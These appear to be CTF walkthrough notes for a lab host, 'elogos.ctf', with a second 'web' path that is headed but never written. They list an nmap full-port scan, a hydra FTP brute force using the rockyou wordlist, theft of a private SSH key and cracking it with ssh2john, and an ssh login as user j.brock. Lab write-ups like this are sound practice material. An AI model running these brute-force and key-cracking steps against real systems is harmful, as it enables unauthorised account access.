### **PORT SCANNING**
```bash
nmap -sT -T5 --min-rate=10000 -p- 192.168.86.129
```
![[Pasted image 20231011153211.png]]

### **PATH 1 - FTP**
Go to http://elogos.ctf/about-us and take note of the listed username (email)
![[Pasted image 20231011153524.png]]

After that launch a brute force with hydra on ftp to gain access
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://elogos.ctf
```

ls -la and take the private ssh key. Crack it.
```
ssh2john id_rsa > hash
```
![[Pasted image 20231011153933.png]]![[Pasted image 20231011154601.png]]

Log in as j.brock via ssh
### **PATH 2 - WEB**
